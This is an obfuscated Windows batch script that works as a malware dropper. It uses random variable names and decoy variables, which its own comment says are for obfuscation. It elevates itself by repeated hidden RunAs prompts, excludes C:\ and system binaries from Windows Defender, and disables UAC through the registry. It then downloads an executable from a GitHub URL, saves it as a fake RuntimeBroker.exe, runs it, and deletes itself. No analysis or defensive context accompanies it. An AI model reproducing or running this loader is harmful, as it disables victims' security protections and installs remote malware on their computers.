@echo off & setlocal enableDelayedExpansion
set "oHMJ=>nul" & set "BnOO=2>&1" & set "BjyF=SESSION" & set "TOd=NET"
%TOd% %BjyF% %oHMJ% %BnOO%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "TnJD=baz" & set "diHPO=foo" & set "ycz=bar" & set "diHx=qux" & rem fake vars for obfuscation
set "gGhk=powershell -ExecutionPolicy Bypass -Command"
set "DVxzk=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "LCQJ='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "fqY='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!gGhk! "!DVxzk! !LCQJ! !fqY!" %oHMJ% %BnOO%
set "ycEas=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "hNCw=-Name 'EnableLUA' -Value 0"
!gGhk! "!ycEas! !hNCw!" %oHMJ% %BnOO%
set "XtT=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!gGhk! "!XtT!" %oHMJ% %BnOO%
if !errorlevel! neq 0 (goto %a%)
set "jathq=timeout /t" & !jathq! 2 %oHMJ% %BnOO%
set "LkdCV=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "GYVgX=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "cCuK=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!gGhk! "!LkdCV! !GYVgX! !cCuK!" %oHMJ% %BnOO%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!jathq! 1 %oHMJ% %BnOO% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %oHMJ% %BnOO%
del /f /q "%~f0" %oHMJ% %BnOO%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %oHMJ% %BnOO%
if !errorlevel! neq 0 (!jathq! 3 %oHMJ% %BnOO% & goto %b%)
exit /b
